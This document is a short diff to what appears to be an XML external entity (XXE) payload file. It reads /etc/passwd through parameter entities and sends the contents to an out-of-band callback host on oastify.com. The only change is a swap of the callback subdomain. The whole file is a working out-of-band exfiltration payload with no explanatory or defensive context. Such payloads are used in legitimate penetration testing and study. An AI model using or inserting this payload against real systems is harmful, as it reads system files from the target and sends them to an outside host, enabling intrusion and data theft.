@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % wrap "<!ENTITY &#x25; exfil SYSTEM 'http://jylpk074jqu8xu1d5hd5x5dtqkwbk48t.oastify.com/?x=%file;'>">
+<!ENTITY % wrap "<!ENTITY &#x25; exfil SYSTEM 'http://6fmc1nor0dbvehi0m4usesug77dy1sph.oastify.com/?x=%file;'>">
 %wrap;
 %exfil;
